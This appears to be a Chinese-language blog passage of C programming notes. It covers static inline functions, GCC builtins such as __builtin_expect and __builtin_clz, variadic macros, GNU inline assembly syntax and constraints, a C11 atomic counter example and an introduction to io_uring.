<p>在Linux内核中，你会看到大量的内联函数被定义在头文件中，而且常常使用static修饰。为什么inline函数经常使用static修饰呢？从C语言到C++，甚至有人还拿出了Linux内核作者Linus关于static inline的解释。</p>
<p>我们可以这样理解：内联函数为什么要定义在头文件中呢？因为它是一个内联函数，可以像宏一样使用，任何想使用这个内联函数的源文件，都不必亲自再去定义一遍，直接包含这个头文件，即可像宏一样使用。那么为什么还要用static修饰呢？因为我们使用inline定义的内联函数，编译器不一定会内联展开，那么当一个工程中多个文件都包含这个内联函数的定义时，编译时就有可能报重定义错误。而使用static关键字修饰，则可以将这个函数的作用域限制在各自的文件内，避免重定义错误的发生。</p>
<h2 id="内建函数"><a href="#内建函数" class="headerlink" title="内建函数"></a>内建函数</h2><p>内建函数，顾名思义，就是编译器内部实现的函数。这些函数和关键字一样，可以直接调用，无须像标准库函数那样，要先声明后使用。内建函数的函数命名，通常以<code>__builtin</code>开头。这些函数主要在编译器内部使用，主要是为编译器服务的。内建函数的主要用途如下。</p>
<ul>
<li>用来处理变长参数列表。</li>
<li>用来处理程序运行异常、编译优化、性能优化。</li>
<li>查看函数运行时的底层信息、堆栈信息等。</li>
<li>实现C标准库的常用函数。</li>
</ul>
<p>因为内建函数是在编译器内部定义的，主要供与编译器相关的工具和程序调用，所以这些函数并没有文档说明，而且变动又频繁，对于应用程序开发者来说，不建议使用这些函数。但有些函数，对于我们了解程序运行的底层机制、编译优化很有帮助，在Linux内核中也经常使用这些函数，所以我们很有必要了解Linux内核中常用的一些内建函数。</p>
<p>常用的内建函数主要有两个：<code>__builtin_return_address()</code>和<code>__builtin_frame_address()</code>。</p>
<p>**<code>__builtin_return_address(LEVEL)</code> ** 用来返回当前函数或调用者的返回地址</p>
<p>函数的参数LEVEL表示函数调用链中不同层级的函数。</p>
<ul>
<li>0：获取当前函数的返回地址。</li>
<li>1：获取上一级函数的返回地址。</li>
<li>2：获取上二级函数的返回地址。</li>
<li>……</li>
</ul>
<p><strong><code>__builtin_frame_address(LEVEL)</code></strong> 用来查看函数的栈帧地址。</p>
<p>函数的参数LEVEL表示函数调用链中不同层级的函数。</p>
<ul>
<li>0：查看当前函数的栈帧地址。</li>
<li>1：查看上一级函数的栈帧地址。</li>
<li>……</li>
</ul>
<hr>
<p><strong><code>__builtin_constant_p(n) </code></strong> 该函数主要用来判断参数n在编译时是否为常量。如果是常量，则函数返回1，否则函数返回0。该函数常用于宏定义中，用来编译优化。一个宏定义，根据宏的参数是常量还是变量，可能实现的方法不一样。在内核源码中，我们经常看到这样的宏。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220115844667.png"
                      alt="image-20250220115844667"
                ></p>
<hr>
<p><strong><code>__builtin_expect(exp，c)</code></strong></p>
<p>这个函数有2个参数，返回值就是其中一个参数，仍是exp。这个函数的意义主要是告诉编译器：参数exp的值为c的可能性很大，然后编译器可以根据这个提示信息，做一些分支预测上的代码优化。参数c与这个函数的返回值无关，无论c为何值，函数的返回值都是exp。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220120004292.png"
                      alt="image-20250220120004292"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220120017977.png"
                      alt="image-20250220120017977"
                ></p>
<p>这个函数的主要用途是编译器的分支预测优化。现在CPU内部都有Cache缓存器件。CPU的运行速度很高，而外部RAM的速度相对来说就低了不少，所以当CPU从内存RAM读写数据时就会有一定的性能瓶颈。为了提高程序执行效率，CPU一般都会通过Cache这个CPU内部缓冲区来缓存一定的指令或数据，当CPU读写内存数据时，会先到Cache看看能否找到：如果找到就直接进行读写；如果找不到，则Cache会重新缓存一部分数据进来。CPU读写Cache的速度远远大于内存RAM，所以通过这种缓存方式可以提高系统的性能。</p>
<p><strong>宏likely和unlikely</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220133319520.png"
                      alt="image-20250220133319520"
                ></p>
<p>这两个宏的主要作用就是告诉编译器：某一个分支发生的概率很高，或者很低，基本不可能发生。编译器根据这个提示信息，在编译程序时就会做一些分支预测上的优化。在这两个宏的定义中有一个细节，就是对宏的参数x做两次取非操作，这是为了将参数x转换为布尔类型，然后与1和0直接做比较，告诉编译器x为真或假的可能性很高。</p>
<p>编译器将小概率发生的if分支汇编代码放在了后面，将大概率发生的else分支的汇编代码放在了前面，这样就确保了程序在执行时，大部分时间都不需要跳转，直接按照顺序执行下面大概率发生的分支代码，可以提高缓存的命中率。</p>
<hr>
<p><code>__builtin_clz()</code>和<code>__builtin_popcount()</code>是GCC（GNU Compiler Collection）提供的内建函数，用于高效地进行位操作。这些函数通常会被编译器优化为单条指令（如果目标架构支持），从而提供比手动实现更高的性能。</p>
<p><strong><code>__builtin_clz()</code> 族函数</strong></p>
<p><code>__builtin_clz()</code>函数用于计算一个整数的二进制表示中，从最高有效位（MSB）到第一个1之间的零的个数。它的名称来源于“count leading zeros”（统计前导零）。</p>
<ul>
<li><p><strong>用法</strong>：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __builtin_clz(<span class="type">unsigned</span> <span class="type">int</span> x);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>变体</strong>：</p>
<ul>
<li><code>__builtin_clzl(unsigned long x)</code>: 用于<code>unsigned long</code>类型。</li>
<li><code>__builtin_clzll(unsigned long long x)</code>: 用于<code>unsigned long long</code>类型。</li>
</ul>
</li>
<li><p><strong>注意事项</strong>：</p>
<ul>
<li>如果传递给<code>__builtin_clz()</code>的值为0，结果是未定义的，因为全为零的情况下没有1存在。</li>
</ul>
</li>
<li><p><strong>示例</strong>：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> x = <span class="number">0x00F0</span>;</span><br><span class="line"><span class="type">int</span> leading_zeros = __builtin_clz(x); <span class="comment">// 结果为24（假设int为32位）</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p><strong><code>__builtin_popcount()</code> 族函数</strong></p>
<p><code>__builtin_popcount()</code>函数用于计算一个整数的二进制表示中1的个数。它的名称来源于“population count”（统计1的个数）。</p>
<ul>
<li><p><strong>用法</strong>：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __builtin_popcount(<span class="type">unsigned</span> <span class="type">int</span> x);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>变体</strong>：</p>
<ul>
<li><code>__builtin_popcountl(unsigned long x)</code>: 用于<code>unsigned long</code>类型。</li>
<li><code>__builtin_popcountll(unsigned long long x)</code>: 用于<code>unsigned long long</code>类型。</li>
</ul>
</li>
<li><p><strong>示例</strong>：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> x = <span class="number">0xF0F0</span>;</span><br><span class="line"><span class="type">int</span> popcount = __builtin_popcount(x); <span class="comment">// 结果为8</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>优势</p>
<ol>
<li><p><strong>性能</strong>：这些内建函数通常会被编译器优化为单条硬件指令（如x86架构上的<code>LZCNT</code>和<code>POPCNT</code>指令），因此比手动实现的循环或查表方法更快。</p>
</li>
<li><p><strong>简洁性</strong>：使用这些函数可以使代码更简洁和易读，避免手动实现复杂的位操作逻辑。</p>
</li>
<li><p><strong>可移植性</strong>：虽然这些函数是GCC特定的，但许多现代编译器（如Clang）也支持它们，提供了一定程度的可移植性。</p>
</li>
</ol>
<p>在使用这些函数时，确保目标平台的编译器支持这些内建函数，并注意处理特殊情况（如<code>__builtin_clz()</code>的输入为0时）。</p>
<h2 id="可变参数宏"><a href="#可变参数宏" class="headerlink" title="可变参数宏"></a>可变参数宏</h2><p>宏连接符<code>##</code>的主要作用就是连接两个字符串。我们在宏定义中可以使用<code>##</code>来连接两个字符，预处理器在预处理阶段对宏展开时，会将<code>##</code>两边的字符合并，并删除<code>##</code>这个连接符。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220134042993.png"
                      alt="image-20250220134042993"
                ></p>
<p>知道了宏连接符<code>##</code>的使用方法，我们就可以对之前提到的s的<code>LOG</code>宏做一些修改。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220134158438.png"
                      alt="image-20250220134158438"
                ></p>
<p>我们在标识符<code>__VA_ARGS__</code>前面加上了宏连接符<code>##</code>，这样做的好处是：当变参列表非空时，<code>##</code>的作用是连接fmt和变参列表，各个参数之间用逗号隔开，宏可以正常使用；当变参列表为空时，＃＃还有一个特殊的用处，它会将固定参数fmt后面的逗号删除掉，这样宏就可以正常使用了。</p>
<hr>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220134613354.png"
                      alt="image-20250220134613354"
                ></p>
<p>这种格式是GNU C扩展的一个新写法：可以不使用<code>__VA_ARGS__</code>，而是直接使用args…来表示一个变参列表，然后在后面的宏定义中，直接使用args代表变参列表就可以了。和上面一样，为了避免变参列表为空时的语法错误，我们也需要在参数之间添加一个连接符<code>##</code>。</p>
<h2 id="当前函数名"><a href="#当前函数名" class="headerlink" title="当前函数名"></a>当前函数名</h2><p>GNU C语言为当前函数的名字准备了两个标识符，它们分别是<code>__PRETTY__FUNCTION__</code>和<code>__FUNCTION__</code>，其中<code>__FUNCTION__</code>标识符保存着函数在源码中的名字，<code>__PRETTY__FUNCTION__</code>标识符则保存着带有语言特色的名字。在C函数中，这两个标识符代表的函数名字相同，参考代码如下所示：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">func_example</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the function name is %s&quot;</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在C99标准中，只规定标识符<code>__func__</code>能够代表函数的名字，而<code>__FUNCTION__</code>虽被各类编译器广泛支持，但只是<code>__func__</code>标识符的宏别名。</p>
<h2 id="内联汇编"><a href="#内联汇编" class="headerlink" title="内联汇编"></a>内联汇编</h2><p>在很多操作系统开发场景中，C语言依然无法完全代替汇编语言。例如，操作某些特殊的CPU寄存器、操作主板上的某些IO端口或者对性能要求极为苛刻的场景等，此时我们必须在C语言内嵌入汇编语言来满足上述要求。GNU C语言提供了关键字asm来声明代码是内嵌的汇编语句，如下面这行代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> nop()     __asm__ __volatile__ (<span class="string">&quot;nop     \n\t&quot;</span>)</span></span><br></pre></td></tr></table></figure></div>

<p>C语言使用关键字<code>__asm__</code>和<code>__volatile__</code>对汇编语句加以修饰，这两个关键字在C语言内嵌汇编语句时经常使用。</p>
<ul>
<li><p><code>__asm__</code>关键字：用于声明这行代码是一个内嵌汇编表达式，它是关键字asm的宏定义（<code>#define __asm__ asm</code>）。故此，它是内嵌汇编语言必不可少的关键字，任何内嵌的汇编表达式都以此关键字作为开头；如果希望编写符合ANSI C标准的代码（即与ANSI C标准相兼容），那么建议使用关键字<code>__asm__</code>。</p>
</li>
<li><p><code>__volatile__</code>关键字：其作用是告诉编译器此行代码不能被编译器优化，编译时保持代码原状。由此看来，它也是内嵌汇编语言不可或缺的关键字，否则经过编译器优化后，汇编语句很可能被修改以至于无法达到预期的执行效果。如果期望编写处符合ANSI C标准的程序（即与ANSI C标准兼容），那么建议使用关键字<code>__volatile__</code>。</p>
</li>
</ul>
<p>GNU C语言的内嵌汇编表达式由4部分构成，它们之间使用<code>&quot;:&quot;</code>号分隔，其完整格式为：<strong>指令部分：输出部分：输入部分：损坏部分</strong></p>
<ul>
<li><p><strong>指令部分</strong>：汇编代码本身，其书写格式与AT&amp;T汇编语言程序的书写格式基本相同，但也存在些许不同之处。指令部分是内嵌汇编表达式的必填项，而其他部分视具体情况而定，如果不需要的话则可以直接忽略。在最简单的情况下，指令部分与常规汇编语句基本相同，如nop函数。</p>
<p>指令部分的编写规则要求是：当指令表达式中存在多条汇编代码时，可全部书写在一对双引号中；亦可将汇编代码放在多对双引号中。如果将所有指令编写在同一双引号中，那么相邻两条指令间必须使用分号（<code>;</code>）或换行符（<code>\n</code>）分隔。如果使用换行符，通常在其后还会紧跟一个制表符（<code>\t</code>）。当汇编代码引用寄存器时，必须在寄存器名前再添加一个 <code>%</code> 符，以表示对寄存器的引用，例如代码<code>&quot;movl $0x10, %%eax&quot;</code>。</p>
</li>
<li><p><strong>输出部分</strong>：紧接在指令部分之后，这部分记录着指令部分的输出信息，其格式为：<strong>“输出操作约束”（输出表达式）, “输出操作约束”（输出表达式）, ……</strong>。格式中的输出操作约束和输出表达式成对出现，整个输出部分可包含多条输出信息，每条信息之间必须使用逗号<code>&quot;,&quot;</code>分隔开。</p>
<ul>
<li>括号内的输出表达式部分主要负责保存指令部分的执行结果。通常情况下，输出表达式是一个变量。</li>
<li>双引号内的部分，被称为“输出操作约束”，也可简称为“输出约束”。输出约束部分必须使用等号<code>“=”</code>或加号<code>“+”</code>进行修饰。这两个符号的区别是，等号<code>“=”</code>意味着输出表达式是一个纯粹的输出操作，加号<code>“+”</code>意味着输出表达式既用于输出操作，又用于输入操作。不论是等号<code>“=”</code>还是加号<code>“+”</code>，它们只能用在输出部分，不能出现在输入部分，而且是可读写的。关于输出约束的更多内容，将在“操作约束和修饰符”中进行补充。</li>
</ul>
</li>
<li><p><strong>输入部分</strong>：记录着指令部分的输入信息，其格式为：<strong>“输入操作约束”（输入表达式）, “输入操作约束”（输入表达式）, ……</strong>。格式中的输入操作约束与输入表达式同样要求成对出现，整个输入部分亦可包含多条输入信息，并用逗号<code>“, ”</code>分隔开。在输入操作约束中<strong>不允许</strong>使用等号<code>“=”</code>和加号<code>“+”</code>，因此输入部分是只读的。</p>
</li>
<li><p><strong>损坏部分</strong>：描述了在指令部分执行的过程中，将被修改的寄存器、内存空间或标志寄存器，并且这些修改部分并未在输出部分和输入部分出现过，格式为：<strong>“损坏描述”, “损坏描述”, ……</strong>。如果需要声明多个寄存器，则必须使用逗号<code>“, ”</code>将它们分隔开，这点与输入&#x2F;输出部分一致。</p>
<ul>
<li><p><strong>寄存器修改通知</strong>。这种情况一般发生在寄存器出现于指令部分，又不是输入&#x2F;输出操作表达式指定的寄存器，更不是编译器为r或g约束选择的寄存器。如果该寄存器被指令部分所修改，那么就应该在损坏部分加以描述，比如下面这行代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__asm__ __volatile__ (<span class="string">&quot;movl %0, %%ecx&quot;</span>::<span class="string">&quot;a&quot;</span>(__tmp):<span class="string">&quot;cx&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>这段汇编表达式的指令部分修改了寄存器ECX的值，却未被任何输入&#x2F;输出部分所记录，那么必须在损坏部分加以描述，一旦编译器发现后续代码还要使用它，便会在内嵌汇编语句的过程中做好数据保存与恢复工作。如果未在损坏部分描述，则很可能会影响后续程序的执行结果。注意，已在损坏部分声明的寄存器，不能作为输入&#x2F;输出操作表达式的寄存器约束，也不会被指派为<code>q 、 r 、 g</code>约束的寄存器。如果在输入&#x2F;输出操作表达式中已明确选定寄存器，或者使用<code>q 、 r 、 g</code>约束让编译器指派寄存器时，编译器对这些寄存器的状态非常清楚，它知道哪些寄存器将会被修改。除此之外，编译器对指令部分修改的寄存器却一无所知。</p>
</li>
<li><p><strong>内存修改通知</strong>：除了寄存器的内容会被篡改外，内存中的数据同样会被修改。如果一个内嵌汇编语句的指令部分修改了内存数据，或者在内嵌汇编表达式出现的地方，内存数据可能发生改变，并且被修改的内存未使用m约束。此时，应该在损坏部分使用字符串memory，向编译器声明内存会发生改变。如果损坏部分已经使用memory对内存加以约束，那么编译器会保证在执行汇编表达式之后，重新向寄存器装载已引用过的内存空间，而非使用寄存器中的副本，以防止内存与副本中的数据不一致。</p>
</li>
<li><p><strong>标志寄存器修改通知</strong>：当内嵌汇编表达式中包含影响标志寄存器<code>R|EFLAGS</code>的指令时，必须在损坏部分使用<code>cc</code>来向编译器声明这一点。</p>
</li>
</ul>
</li>
</ul>
<hr>
<p><strong>操作约束和修饰符</strong></p>
<p>每个输入&#x2F;输出表达式都必须指定自身的操作约束。操作约束的类型可以细分为寄存器约束、内存约束和立即数约束。在输出表达式中，还有限定寄存器操作的修饰符。</p>
<ul>
<li><p><strong>寄存器约束</strong>限定了表达式的载体是一个寄存器，这个寄存器可以明确指派，亦可模糊指派再由编译器自行分配。寄存器约束可使用寄存器的全名，也可以使用寄存器的缩写名称，如下所示：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__asm__ __volatile__(<span class="string">&quot;movl %0, %%cr0&quot;</span>::<span class="string">&quot;eax&quot;</span>(cr0));</span><br><span class="line">__asm__ __volatile__(<span class="string">&quot;movl %0, %%cr0&quot;</span>::<span class="string">&quot;a&quot;</span>(cr0));</span><br></pre></td></tr></table></figure></div>

<p>如果使用寄存器的缩写名称，那么编译器会根据指令部分的汇编代码来确定寄存器的实际位宽。下表记录了常用的约束缩写名称。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250314172903564.png"
                      alt="image-20250314172903564"
                ></p>
</li>
<li><p><strong>内存约束</strong>限定了表达式的载体是一个内存空间，使用约束名m表示。例如以下内嵌汇编表达式：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__asm__ __volatile__ (<span class="string">&quot;sgdt %0&quot;</span>:<span class="string">&quot;=m&quot;</span>(__gdt_addr)::);</span><br><span class="line">__asm__ __volatile__ (<span class="string">&quot;lgdt %0&quot;</span>::<span class="string">&quot;m&quot;</span>(__gdt_addr));</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>立即数约束</strong>只能用于输入部分，它限定了表达式的载体是一个数值，如果不想借助任何寄存器或内存，那么可以使用立即数约束，比如下面这行代码：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__asm__ __volatile__(<span class="string">&quot;movl %0, %%ebx&quot;</span>::<span class="string">&quot;i&quot;</span>(<span class="number">50</span>));</span><br></pre></td></tr></table></figure></div>

<p>使用约束名<code>i</code>限定输入表达式是一个整数类型的立即数，如果希望限定输入表达式是一个浮点数类型的立即数，则使用约束名<code>F</code>。立即数约束只能使用在输入部分</p>
</li>
<li><p><strong>修饰符</strong>只可用在输出部分，除了等号 &#x3D; 和加号 + 外，还有 &amp; 符。符号 &amp; 只能写在输出约束部分的第二个字符位置上，即只能位于&#x3D;和 + 之后，它告诉编译器不得为任何输入操作表达式分配该寄存器。因为编译器会在输入部分赋值前，先对 &amp;符号修饰的寄存器进行赋值，一旦后面的输入操作表达式向该寄存器赋值，将会造成输入和输出数据混乱。</p>
<p>只有在输入约束中使用过模糊约束（使用q、r或g等约束缩写）时，在输出约束中使用符号&amp;修饰才有意义！如果所有输入操作表达式都明确指派了寄存器，那么输出约束再使用符号 &amp; 就没有任何意义。如果没有使用修饰符 &amp;，那就意味着编译器将先对输入部分进行赋值，当指令部分执行结束后，再对输出部分进行操作。</p>
</li>
</ul>
<p><strong>序号占位符</strong></p>
<p>序号占位符是输入&#x2F;输出操作约束的数值映射，每个内嵌汇编表达式最多只有10条输入&#x2F;输出约束，这些约束按照书写顺序依次被映射为序号0～9。如果指令部分想引用序号占位符，必须使用百分号%前缀加以修饰，例如序号占位符%0对应第1个操作约束，序号占位符%1对应第2个操作约束，依次类推。指令部分为了区分序号占位符和寄存器，特使用两个百分号(%%)对寄存器加以修饰。在编译时，编译器会将每个占位符代表的表达式替换到相应的寄存器或内存中。</p>
<p>指令部分在引用序号占位符时，可以根据需要指定操作位宽是字节或者字，也可以指定操作的字节位置，即在%与序号占位符之间插入字母b表示操作最低字节，或插入字母h表示操作次低字节</p>
<h1 id="现代-C-语言"><a href="#现代-C-语言" class="headerlink" title="现代 C 语言"></a>现代 C 语言</h1><h2 id="c99"><a href="#c99" class="headerlink" title="c99"></a>c99</h2><h2 id="c11"><a href="#c11" class="headerlink" title="c11"></a>c11</h2><p>在C语言中，原子操作通常用于实现无锁编程，特别是在多线程环境中。这些操作可以帮助开发者在不使用锁的情况下实现线程安全的数据结构和算法。C11标准引入了原子操作的支持，通过<code>stdatomic.h</code>头文件提供了一组原子操作函数和类型。</p>
<h3 id="原子操作库"><a href="#原子操作库" class="headerlink" title="原子操作库"></a>原子操作库</h3><p>C11标准中的原子操作库提供了一些基本的原子类型和操作，用于在多线程环境中安全地访问和修改共享变量。</p>
<h4 id="基本原子类型"><a href="#基本原子类型" class="headerlink" title="基本原子类型"></a>基本原子类型</h4><ul>
<li><code>atomic_bool</code></li>
<li><code>atomic_char</code></li>
<li><code>atomic_schar</code></li>
<li><code>atomic_uchar</code></li>
<li><code>atomic_short</code></li>
<li><code>atomic_ushort</code></li>
<li><code>atomic_int</code></li>
<li><code>atomic_uint</code></li>
<li><code>atomic_long</code></li>
<li><code>atomic_ulong</code></li>
<li><code>atomic_llong</code></li>
<li><code>atomic_ullong</code></li>
<li><code>atomic_char16_t</code></li>
<li><code>atomic_char32_t</code></li>
<li><code>atomic_wchar_t</code></li>
<li><code>atomic_intptr_t</code></li>
<li><code>atomic_uintptr_t</code></li>
<li><code>atomic_size_t</code></li>
<li><code>atomic_ptrdiff_t</code></li>
<li><code>atomic_intmax_t</code></li>
<li><code>atomic_uintmax_t</code></li>
</ul>
<h4 id="常用原子操作"><a href="#常用原子操作" class="headerlink" title="常用原子操作"></a>常用原子操作</h4><ol>
<li><p><strong>原子加载和存储</strong>:</p>
<ul>
<li><code>atomic_store</code> 和 <code>atomic_load</code> 用于原子地存储和加载值。</li>
</ul>
</li>
<li><p><strong>原子读-改-写操作</strong>:</p>
<ul>
<li><code>atomic_fetch_add</code>, <code>atomic_fetch_sub</code>, <code>atomic_fetch_or</code>, <code>atomic_fetch_and</code>, <code>atomic_fetch_xor</code> 等，用于执行原子的加、减、或、与、异或操作。</li>
</ul>
</li>
<li><p><strong>比较并交换</strong>:</p>
<ul>
<li><code>atomic_compare_exchange_strong</code> 和 <code>atomic_compare_exchange_weak</code> 用于原子地比较并交换值。</li>
</ul>
</li>
<li><p><strong>内存顺序</strong>:</p>
<ul>
<li><code>memory_order_relaxed</code>, <code>memory_order_consume</code>, <code>memory_order_acquire</code>, <code>memory_order_release</code>, <code>memory_order_acq_rel</code>, <code>memory_order_seq_cst</code> 用于指定内存操作的顺序。</li>
</ul>
</li>
</ol>
<p><strong>示例代码</strong></p>
<p>以下是一个使用C11原子操作库实现简单计数器的示例：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdatomic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;threads.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">atomic_int</span> counter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">increment_counter</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; ++i) &#123;</span><br><span class="line">        atomic_fetch_add(&amp;counter, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">thrd_t</span> threads[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建10个线程来增加计数器</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        thrd_create(&amp;threads[i], increment_counter, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待所有线程完成</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        thrd_join(threads[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Final counter value: %d\n&quot;</span>, <span class="type">atomic_load</span>(&amp;counter));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>关键点</strong></p>
<ul>
<li><strong>线程安全</strong>: 原子操作允许多个线程安全地访问和修改共享变量，而无需使用锁。</li>
<li><strong>性能</strong>: 原子操作通常比锁更高效，因为它们避免了上下文切换和锁竞争。</li>
<li><strong>内存顺序</strong>: 通过指定内存顺序，可以控制操作的可见性和顺序，以满足不同的同步需求。</li>
</ul>
<p>C11的原子操作库为C语言开发者提供了一种标准化的方式来实现无锁编程，使得在多线程环境中可以更高效地进行同步和资源管理。</p>
<h2 id="c17"><a href="#c17" class="headerlink" title="c17"></a>c17</h2><h2 id="c23"><a href="#c23" class="headerlink" title="c23"></a>c23</h2><p><a class="link"   target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/C23_(C_standard_revision)#Features" >c23新特性<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h1><h1 id="原子编程"><a href="#原子编程" class="headerlink" title="原子编程"></a>原子编程</h1><h1 id="无锁编程"><a href="#无锁编程" class="headerlink" title="无锁编程"></a>无锁编程</h1><h1 id="异步编程"><a href="#异步编程" class="headerlink" title="异步编程"></a>异步编程</h1><p><a class="link"   target="_blank" rel="noopener" href="https://arthurchiao.art/blog/intro-to-io-uring-zh/" >建议阅读<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="io-uring"><a href="#io-uring" class="headerlink" title="io_uring"></a>io_uring</h2><p><code>io_uring</code> 是 Linux 内核自 5.1 版本引入的一个高效异步 I&#x2F;O 接口，旨在提高 I&#x2F;O 操作的性能和可扩展性。与传统的异步 I&#x2F;O 接口（如 <code>aio</code>）相比，<code>io_uring</code> 提供了更高的性能、更低的延迟和更好的易用性。以下是对 <code>io_uring</code> 的详细解析，包括其工作原理、使用方法和一些示例代码。</p>
<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p><code>io_uring</code> 使用两个环形缓冲区（环）来实现异步 I&#x2F;O 操作：</p>
<ol>
<li><strong>提交队列（Submission Queue, SQ）</strong>: 用户空间将 I&#x2F;O 请求提交到这个队列。</li>
<li><strong>完成队列（Completion Queue, CQ）</strong>: 内核将完成的 I&#x2F;O 请求结果放入这个队列。</li>
</ol>
<p>这种设计允许用户空间和内核之间的交互最小化，从而减少系统调用的开销。</p>
<h3 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h3><ol>
